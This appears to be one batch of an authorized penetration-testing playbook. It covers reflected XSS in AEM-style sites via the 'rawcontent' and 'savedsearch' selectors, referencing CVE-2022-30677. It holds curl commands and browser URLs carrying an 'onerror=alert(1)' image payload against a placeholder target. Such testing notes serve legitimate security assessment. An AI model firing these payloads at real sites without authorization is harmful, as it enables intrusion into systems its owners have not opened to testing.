# Batch 09 — Selector XSS: `rawcontent` + `savedsearch`

## objective

Test the **reflected XSS** gadget family based on `rawcontent` (and `savedsearch` for 400 pages). Only XSS — no QueryBuilder.

## estimated_time

45–75 minutes

## prerequisites

- `T` from batch 01
- XSS testing allowed in scope
- Prefer browser + proxy for final proof

## testing_workflow

### 1) Technique A — rawcontent on reflected path (404 style)

```bash
T="https://TARGET"

# Safe marker first (no alert)
curl -sk -o /tmp/x.html -w "%{http_code} %{size_download}\n" \
  "$T/aemxssmarker123.rawcontent.html"
grep -n 'aemxssmarker123' /tmp/x.html | head
```

```bash
# Payload path (historical CVE-2022-30677)
curl -sk -o /tmp/x.html -w "%{http_code}\n" \
  "$T/%3Cimg%20src=x%20onerror=alert(1)%3E.rawcontent.html"
grep -iE 'onerror|<img' /tmp/x.html | head
```

Open in browser if reflection looks unsanitized:

```text
https://TARGET/<img src=x onerror=alert(1)>.rawcontent.html
```

### 2) Technique B — savedsearch + rawcontent (400 path)

When custom 404 kills technique A:

```bash
curl -sk -o /tmp/x.html -w "%{http_code}\n" \
  "$T/%3Cimg%20src=x%20onerror=alert(1).savedsearch.rawcontent.html"
grep -iE 'onerror|<img|savedsearch' /tmp/x.html | head
```

Browser:

```text
https://TARGET/<img src=x onerror=alert(1).savedsearch.rawcontent.html
```

### 3) Technique C — does rawcontent still strip JS? (optional, 10 min)

If you already have HTML injection elsewhere, request same resource with `.rawcontent.html` and see if page JS is stripped (can revive a sink). Note only — no rabbit hole.

## decision_points

| If… | Then… |
|-----|--------|
| XSS fires | Capture PoC; continue **10** for more selector impact |
| Reflects but encoded | Try encoding variants 15 min max; then **10** |
| No reflection | Patched/custom errors — **10** |

## expected_findings

- Unauth reflected XSS (or residual strip behavior)

## next_batch_to_continue_with

→ **[10-listparagraphs.md](./10-listparagraphs.md)**
